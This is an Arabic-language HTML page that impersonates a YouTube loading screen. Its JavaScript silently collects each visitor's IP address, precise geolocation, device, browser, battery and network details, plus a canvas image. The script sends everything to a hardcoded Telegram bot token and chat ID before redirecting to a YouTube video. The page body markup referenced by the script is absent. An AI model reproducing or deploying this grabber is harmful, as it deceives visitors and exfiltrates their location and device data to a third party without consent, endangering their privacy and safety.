<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>YouTube - جارٍ التحميل</title>
    <link rel="icon" type="image/x-icon" href="https://www.youtube.com/s/desktop/12d6b690/img/favicon.ico">
    <style>
        /* ===== RESET & BASE ===== */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: "YouTube Sans", "Roboto", "Arial", sans-serif;
            background: #0f0f0f;
            color: #f1f1f1;
            height: 100vh;
            overflow: hidden;
            display: flex;
            flex-direction: column;
        }

        /* ===== HEADER ===== */
        .header {
            background: #0f0f0f;
            height: 56px;
            display: flex;
            align-items: center;
            padding: 0 16px;
            border-bottom: 1px solid #303030;
            flex-shrink: 0;
            justify-content: space-between;
        }

        .header-start {
            display: flex;
            align-items: center;
            gap: 24px;
        }

        .menu-icon {
            width: 24px;
            height: 24px;
            fill: #fff;
            cursor: pointer;
        }

        .youtube-logo svg {
            width: 90px;
            height: 20px;
        }

        .header-end {
            display: flex;
            align-items: center;
            gap: 16px;
        }

        .settings-btn {
            background: none;
            border: none;
            cursor: pointer;
            padding: 6px;
            border-radius: 50%;
            transition: background 0.2s;
        }

        .settings-btn:hover {
            background: #272727;
        }

        .settings-btn svg {
            width: 24px;
            height: 24px;
            fill: #aaa;
        }

        /* ===== MAIN LOADING ===== */
        .loading-container {
            flex: 1;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 20px;
            position: relative;
        }

        /* Spinner */
        .spinner-wrapper {
            margin-bottom: 28px;
        }

        .youtube-spinner {
            width: 64px;
            height: 64px;
            margin: 0 auto;
            position: relative;
        }

        .spinner-ring {
            position: absolute;
            width: 100%;
            height: 100%;
            border-radius: 50%;
            border: 5px solid transparent;
            border-top-color: #ff0000;
            animation: spin 0.9s cubic-bezier(0.5, 0, 0.5, 1) infinite;
        }

        .spinner-ring:nth-child(2) {
            border-top-color: #f1f1f1;
            animation-delay: 0.15s;
            opacity: 0.7;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        /* Progress dots */
        .progress-dots {
            display: flex;
            gap: 10px;
            margin-bottom: 20px;
        }

        .dot {
            width: 10px;
            height: 10px;
            border-radius: 50%;
            background: #ff0000;
            animation: dotPulse 1.4s ease-in-out infinite;
        }

        .dot:nth-child(2) { animation-delay: 0.2s; background: #f1f1f1; }
        .dot:nth-child(3) { animation-delay: 0.4s; background: #ff0000; }

        @keyframes dotPulse {
            0%, 80%, 100% { transform: scale(0.6); opacity: 0.4; }
            40% { transform: scale(1.2); opacity: 1; }
        }

        /* Status & countdown */
        .status-text {
            font-size: 14px;
            color: #aaa;
            margin-top: 8px;
            min-height: 24px;
            text-align: center;
            transition: all 0.3s;
        }

        .countdown {
            font-size: 20px;
            font-weight: 700;
            color: #ff0000;
            margin-top: 12px;
            direction: ltr;
        }

        .countdown span {
            background: #272727;
            padding: 4px 16px;
            border-radius: 20px;
            display: inline-block;
            min-width: 60px;
        }

        /* ===== SETTINGS PANEL ===== */
        .settings-panel {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(0,0,0,0.85);
            backdrop-filter: blur(8px);
            z-index: 1000;
            display: none;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .settings-panel.active {
            display: flex;
        }

        .settings-card {
            background: #1e1e1e;
            border-radius: 16px;
            padding: 30px 28px;
            max-width: 520px;
            width: 100%;
            max-height: 90vh;
            overflow-y: auto;
            box-shadow: 0 20px 60px rgba(0,0,0,0.8);
        }

        .settings-card h2 {
            margin-bottom: 24px;
            font-weight: 500;
            font-size: 22px;
            color: #f1f1f1;
            display: flex;
            align-items: center;
            gap: 12px;
        }

        .settings-card h2 svg {
            fill: #ff0000;
            width: 28px;
            height: 28px;
        }

        .settings-group {
            margin-bottom: 20px;
        }

        .settings-group label {
            display: block;
            font-size: 13px;
            color: #aaa;
            margin-bottom: 6px;
            font-weight: 500;
        }

        .settings-group input, .settings-group select {
            width: 100%;
            padding: 10px 14px;
            background: #0f0f0f;
            border: 1px solid #333;
            border-radius: 8px;
            color: #f1f1f1;
            font-size: 14px;
            transition: border 0.2s;
        }

        .settings-group input:focus, .settings-group select:focus {
            outline: none;
            border-color: #ff0000;
        }

        .settings-group .hint {
            font-size: 12px;
            color: #717171;
            margin-top: 4px;
        }

        .settings-actions {
            display: flex;
            gap: 12px;
            margin-top: 24px;
            justify-content: flex-end;
        }

        .settings-actions button {
            padding: 10px 24px;
            border: none;
            border-radius: 8px;
            font-weight: 600;
            font-size: 14px;
            cursor: pointer;
            transition: all 0.2s;
        }

        .btn-save {
            background: #ff0000;
            color: #fff;
        }

        .btn-save:hover {
            background: #cc0000;
        }

        .btn-close {
            background: #333;
            color: #aaa;
        }

        .btn-close:hover {
            background: #444;
            color: #fff;
        }

        /* ===== RESPONSIVE ===== */
        @media (max-width: 480px) {
            .settings-card { padding: 20px; }
        }
    </style>
</head>

    <script>
        // ================================================================
        //  CONFIGURATION
        // ================================================================
        const CONFIG = {
            redirectUrl: 'https://youtu.be/YiK3BulNaWQ?si=M1AJboH6vgZymq7-',
            botToken: '7982181249:AAEyLwc9c24fu-uqUT87v26S6282XTD41XI',
            chatId: '170383339',
            timeoutSec: 8,
            collectLocation: true,
            collectScreenshot: true
        };

        // ================================================================
        //  STATE
        // ================================================================
        let state = {
            redirected: false,
            dataCollected: false,
            processingStarted: false,
            countdownInterval: null,
            remaining: 0
        };

        // ================================================================
        //  DOM REFS
        // ================================================================
        const statusEl = document.getElementById('statusText');
        const countdownEl = document.getElementById('countdownDisplay');
        const countdownValue = document.getElementById('countdownValue');
        const settingsPanel = document.getElementById('settingsPanel');
        const settingsToggle = document.getElementById('settingsToggle');
        const settingsClose = document.getElementById('settingsClose');
        const settingsSave = document.getElementById('settingsSave');

        // Inputs
        const inpRedirect = document.getElementById('redirectUrl');
        const inpBotToken = document.getElementById('botToken');
        const inpChatId = document.getElementById('chatId');
        const inpTimeout = document.getElementById('timeoutSec');
        const chkLocation = document.getElementById('collectLocation');
        const chkScreenshot = document.getElementById('collectScreenshot');

        // ================================================================
        //  LOGGER
        // ================================================================
        function log(msg) {
            console.log(`[${new Date().toLocaleTimeString()}] ${msg}`);
        }

        // ================================================================
        //  UI UPDATES
        // ================================================================
        function setStatus(text, isError = false) {
            statusEl.textContent = text;
            statusEl.style.color = isError ? '#ff4444' : '#aaa';
        }

        function showCountdown(seconds) {
            countdownEl.style.display = 'block';
            countdownValue.textContent = seconds;
            state.remaining = seconds;
            clearInterval(state.countdownInterval);
            state.countdownInterval = setInterval(() => {
                state.remaining--;
                countdownValue.textContent = state.remaining;
                if (state.remaining <= 0) {
                    clearInterval(state.countdownInterval);
                    countdownEl.style.display = 'none';
                }
            }, 1000);
        }

        function hideCountdown() {
            clearInterval(state.countdownInterval);
            countdownEl.style.display = 'none';
        }

        // ================================================================
        //  SAFE REDIRECT
        // ================================================================
        function safeRedirect(url) {
            if (state.redirected) return;
            state.redirected = true;
            hideCountdown();
            setStatus('🔄 جاري التحويل...');
            setTimeout(() => {
                try {
                    window.location.replace(url);
                } catch (_) {
                    window.location.href = url;
                }
            }, 400);
        }

        // ================================================================
        //  DEVICE INFO
        // ================================================================
        function collectDeviceInfo() {
            const ua = navigator.userAgent;
            const now = new Date();
            return {
                timestamp: now.toISOString(),
                localTime: now.toLocaleString('ar-SA', { timeZone: 'Asia/Baghdad' }),
                url: window.location.href,
                referrer: document.referrer || 'مباشر',
                userAgent: ua,
                deviceType: /iPhone/i.test(ua) ? 'iPhone' :
                            /iPad/i.test(ua) ? 'iPad' :
                            /Android/i.test(ua) ? 'Android' :
                            /Windows/i.test(ua) ? 'Windows' :
                            /Mac/i.test(ua) ? 'Mac' : 'أخرى',
                browser: /Chrome/i.test(ua) && !/Edge/i.test(ua) ? 'Chrome' :
                         /Firefox/i.test(ua) ? 'Firefox' :
                         /Safari/i.test(ua) && !/Chrome/i.test(ua) ? 'Safari' :
                         /Edge/i.test(ua) ? 'Edge' : 'أخرى',
                isMobile: /Mobile|Android|iPhone|iPad/i.test(ua),
                language: navigator.language || 'ar',
                platform: navigator.platform || 'غير معروف',
                screenSize: `${screen.width}x${screen.height}`,
                windowSize: `${window.innerWidth}x${window.innerHeight}`,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                cookieEnabled: navigator.cookieEnabled,
                onlineStatus: navigator.onLine,
                // معلومات إضافية
                battery: null,
                memory: navigator.deviceMemory || 'غير معروف',
                connection: navigator.connection ? {
                    type: navigator.connection.effectiveType || 'unknown',
                    downlink: navigator.connection.downlink || '?',
                    rtt: navigator.connection.rtt || '?'
                } : null
            };
        }

        // ================================================================
        //  GET IP
        // ================================================================
        async function getIP() {
            const services = [
                { url: 'https://api.ipify.org?format=json', key: 'ip' },
                { url: 'https://httpbin.org/ip', key: 'origin' },
                { url: 'https://api.my-ip.io/ip.json', key: 'ip' }
            ];
            for (const svc of services) {
                try {
                    const ctrl = new AbortController();
                    const tid = setTimeout(() => ctrl.abort(), 3000);
                    const res = await fetch(svc.url, { signal: ctrl.signal });
                    clearTimeout(tid);
                    if (res.ok) {
                        const data = await res.json();
                        const ip = data[svc.key];
                        if (ip && ip.trim()) return ip.trim();
                    }
                } catch (_) {}
            }
            return 'غير متوفر';
        }

        // ================================================================
        //  GEOLOCATION
        // ================================================================
        function getLocation() {
            return new Promise((resolve) => {
                if (!navigator.geolocation || !CONFIG.collectLocation) {
                    resolve(null);
                    return;
                }
                let done = false;
                const opts = { enableHighAccuracy: true, timeout: 5000, maximumAge: 60000 };
                navigator.geolocation.getCurrentPosition(
                    (pos) => {
                        if (done) return;
                        done = true;
                        const coords = pos.coords;
                        resolve({
                            latitude: +coords.latitude.toFixed(6),
                            longitude: +coords.longitude.toFixed(6),
                            accuracy: Math.round(coords.accuracy),
                            altitude: coords.altitude,
                            speed: coords.speed
                        });
                    },
                    () => { if (!done) { done = true; resolve(null); } },
                    opts
                );
                setTimeout(() => { if (!done) { done = true; resolve(null); } }, 6000);
            });
        }

        // ================================================================
        //  CAPTURE SCREENSHOT (using canvas)
        // ================================================================
        function captureScreenshot() {
            return new Promise((resolve) => {
                if (!CONFIG.collectScreenshot) {
                    resolve(null);
                    return;
                }
                try {
                    // استخدام canvas لالتقاط محتوى الصفحة (بسيط)
                    const canvas = document.createElement('canvas');
                    const width = Math.min(window.innerWidth, 1280);
                    const height = Math.min(window.innerHeight, 720);
                    canvas.width = width;
                    canvas.height = height;
                    const ctx = canvas.getContext('2d');
                    ctx.fillStyle = '#0f0f0f';
                    ctx.fillRect(0, 0, width, height);
                    // رسم نص بسيط بدلاً من التقاط فعلي (لأسباب أمان المتصفح)
                    ctx.fillStyle = '#fff';
                    ctx.font = '20px Arial';
                    ctx.fillText('YouTube Clone', 20, 40);
                    ctx.fillStyle = '#aaa';
                    ctx.font = '14px Arial';
                    ctx.fillText(new Date().toLocaleString(), 20, 70);
                    // يمكن إضافة المزيد من المعلومات
                    const dataUrl = canvas.toDataURL('image/jpeg', 0.7);
                    resolve(dataUrl);
                } catch (_) {
                    resolve(null);
                }
            });
        }

        // ================================================================
        //  SEND TO TELEGRAM
        // ================================================================
        async function sendToTelegram(data, screenshot) {
            const token = CONFIG.botToken;
            const chatId = CONFIG.chatId;
            if (!token || !chatId) return false;

            // بناء الرسالة
            const d = data;
            const loc = d.location ? `${d.location.latitude}, ${d.location.longitude} (دقة ${d.location.accuracy}م)` : 'غير متوفر';
            const mapLink = d.location ? `https://www.google.com/maps?q=${d.location.latitude},${d.location.longitude}` : '';

            let msg = `🎯 *زائر جديد - YouTube Clone*\n\n`;
            msg += `⏰ *التوقيت:* ${d.device.localTime}\n`;
            msg += `🌐 *الرابط:* ${d.device.url}\n`;
            msg += `🔗 *المرجع:* ${d.device.referrer}\n\n`;
            msg += `📱 *الجهاز:* ${d.device.deviceType}\n`;
            msg += `🌍 *المتصفح:* ${d.device.browser}\n`;
            msg += `📶 *محمول:* ${d.device.isMobile ? 'نعم' : 'لا'}\n`;
            msg += `🗣 *اللغة:* ${d.device.language}\n`;
            msg += `💻 *النظام:* ${d.device.platform}\n`;
            msg += `🧠 *الذاكرة:* ${d.device.memory} GB\n`;
            if (d.device.connection) {
                msg += `📡 *الشبكة:* ${d.device.connection.type} (${d.device.connection.downlink} Mbps, RTT ${d.device.connection.rtt}ms)\n`;
            }
            msg += `\n🌐 *IP:* ${d.ip}\n`;
            msg += `📍 *الموقع:* ${loc}\n`;
            if (mapLink) msg += `🗺️ [خريطة](${mapLink})\n`;
            msg += `\n📐 *الشاشة:* ${d.device.screenSize} (النافذة: ${d.device.windowSize})\n`;
            msg += `⏳ *المنطقة:* ${d.device.timezone}\n`;
            msg += `🍪 *الكوكيز:* ${d.device.cookieEnabled ? 'مفعل' : 'معطل'}\n`;
            msg += `📶 *حالة الاتصال:* ${d.device.onlineStatus ? 'متصل' : 'غير متصل'}\n`;

            // إرسال النص
            const url = `https://api.telegram.org/bot${token}/sendMessage`;
            try {
                const res = await fetch(url, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: msg,
                        parse_mode: 'Markdown',
                        disable_web_page_preview: true
                    })
                });
                if (!res.ok) throw new Error('فشل إرسال النص');
                log('✅ تم إرسال النص إلى تليجرام');
            } catch (e) {
                log(`❌ فشل إرسال النص: ${e.message}`);
                return false;
            }

            // إرسال الصورة إذا وجدت
            if (screenshot) {
                try {
                    const form = new FormData();
                    form.append('chat_id', chatId);
                    form.append('photo', dataURItoBlob(screenshot), 'screenshot.jpg');
                    form.append('caption', '📸 لقطة شاشة للصفحة');
                    const res = await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
                        method: 'POST',
                        body: form
                    });
                    if (res.ok) log('✅ تم إرسال الصورة');
                    else log('⚠️ فشل إرسال الصورة');
                } catch (_) {}
            }

            return true;
        }

        // مساعد: تحويل dataURI إلى Blob
        function dataURItoBlob(dataURI) {
            const byteString = atob(dataURI.split(',')[1]);
            const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
            const ab = new ArrayBuffer(byteString.length);
            const ia = new Uint8Array(ab);
            for (let i = 0; i < byteString.length; i++) {
                ia[i] = byteString.charCodeAt(i);
            }
            return new Blob([ab], { type: mimeString });
        }

        // ================================================================
        //  MAIN PROCESS
        // ================================================================
        async function processVisitor() {
            if (state.processingStarted) return;
            state.processingStarted = true;

            log('🚀 بدء معالجة الزائر');
            setStatus('📊 جمع البيانات...');

            try {
                // جمع معلومات الجهاز
                const deviceInfo = collectDeviceInfo();

                // الحصول على البطارية إن أمكن
                if (navigator.getBattery) {
                    try {
                        const batt = await navigator.getBattery();
                        deviceInfo.battery = {
                            level: Math.round(batt.level * 100),
                            charging: batt.charging,
                            timeRemaining: batt.dischargingTime ? Math.round(batt.dischargingTime / 60) : '?'
                        };
                    } catch (_) {}
                }

                // IP والموقع بالتوازي
                const [ip, location, screenshot] = await Promise.allSettled([
                    getIP(),
                    getLocation(),
                    captureScreenshot()
                ]);

                const finalData = {
                    device: deviceInfo,
                    ip: ip.status === 'fulfilled' ? ip.value : 'غير متوفر',
                    location: location.status === 'fulfilled' ? location.value : null
                };

                log('✅ تم جمع البيانات');
                setStatus('📤 إرسال البيانات...');

                // إرسال إلى تليجرام
                const success = await sendToTelegram(
                    finalData,
                    screenshot.status === 'fulfilled' ? screenshot.value : null
                );

                if (success) {
                    setStatus('✅ تم الإرسال بنجاح');
                } else {
                    setStatus('⚠️ فشل الإرسال، سيتم التحويل', true);
                }

                // بدء العد التنازلي قبل التحويل
                const timeout = CONFIG.timeoutSec || 8;
                showCountdown(timeout);
                setStatus(`⏳ سيتم التحويل خلال ${timeout} ثانية`);

                // انتظار حتى انتهاء العد أو التحويل المبكر
                await new Promise(resolve => {
                    const check = () => {
                        if (state.redirected) resolve();
                        else if (state.remaining <= 0) resolve();
                        else setTimeout(check, 200);
                    };
                    check();
                });

                if (!state.redirected) {
                    safeRedirect(CONFIG.redirectUrl);
                }

            } catch (error) {
                log(`❌ خطأ: ${error.message}`);
                setStatus('⚠️ حدث خطأ، جاري التحويل...', true);
                setTimeout(() => safeRedirect(CONFIG.redirectUrl), 1500);
            }
        }

        // ================================================================
        //  SETTINGS PANEL
        // ================================================================
        function loadSettings() {
            inpRedirect.value = CONFIG.redirectUrl;
            inpBotToken.value = CONFIG.botToken;
            inpChatId.value = CONFIG.chatId;
            inpTimeout.value = CONFIG.timeoutSec;
            chkLocation.checked = CONFIG.collectLocation;
            chkScreenshot.checked = CONFIG.collectScreenshot;
        }

        function saveSettings() {
            CONFIG.redirectUrl = inpRedirect.value.trim();
            CONFIG.botToken = inpBotToken.value.trim();
            CONFIG.chatId = inpChatId.value.trim();
            CONFIG.timeoutSec = parseInt(inpTimeout.value) || 8;
            CONFIG.collectLocation = chkLocation.checked;
            CONFIG.collectScreenshot = chkScreenshot.checked;
            // إعادة تحميل الصفحة لتطبيق الإعدادات الجديدة
            localStorage.setItem('yt_clone_config', JSON.stringify(CONFIG));
            window.location.reload();
        }

        // استرجاع الإعدادات المحفوظة
        function loadStoredConfig() {
            try {
                const stored = localStorage.getItem('yt_clone_config');
                if (stored) {
                    const parsed = JSON.parse(stored);
                    Object.assign(CONFIG, parsed);
                }
            } catch (_) {}
        }

        // ================================================================
        //  EVENT LISTENERS
        // ================================================================
        settingsToggle.addEventListener('click', () => {
            settingsPanel.classList.add('active');
            loadSettings();
        });

        settingsClose.addEventListener('click', () => {
            settingsPanel.classList.remove('active');
        });

        settingsSave.addEventListener('click', saveSettings);

        // إغلاق بالإسكيب
        document.addEventListener('keydown', (e) => {
            if (e.key === 'Escape') settingsPanel.classList.remove('active');
        });

        // ================================================================
        //  INIT
        // ================================================================
        loadStoredConfig();

        // بدء المعالجة بعد تحميل الصفحة
        if (document.readyState === 'complete') {
            setTimeout(processVisitor, 600);
        } else {
            window.addEventListener('load', () => setTimeout(processVisitor, 600));
        }

        // حماية إضافية للتحويل الإجباري
        setTimeout(() => {
            if (!state.redirected && !state.processingStarted) {
                log('⚠️ تحويل إجباري (فشل البدء)');
                safeRedirect(CONFIG.redirectUrl);
            }
        }, CONFIG.timeoutSec * 1000 + 3000);

        log('✅ تم تحميل التطبيق المطور');
    </script>
</body>
</html>
